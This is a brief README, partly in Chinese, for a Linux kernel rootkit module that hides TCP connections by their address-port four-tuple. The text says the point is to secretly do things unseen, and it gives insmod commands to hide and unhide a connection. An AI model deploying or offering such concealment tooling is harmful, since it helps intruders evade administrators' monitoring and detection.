# TCP-Rootkit
Hide your tcp connection！！！

该模块可以根据四元组隐藏你的TCP连接，偷偷干点儿不为人知的事情。

隐藏：
insmod ./hide_connection.ko daddr=0x6e38a8c0 dport=2222 saddr=0x6538a8c0 ifindex=3 sport=50618

恢复：
insmod ./hide_connection.ko hide=0
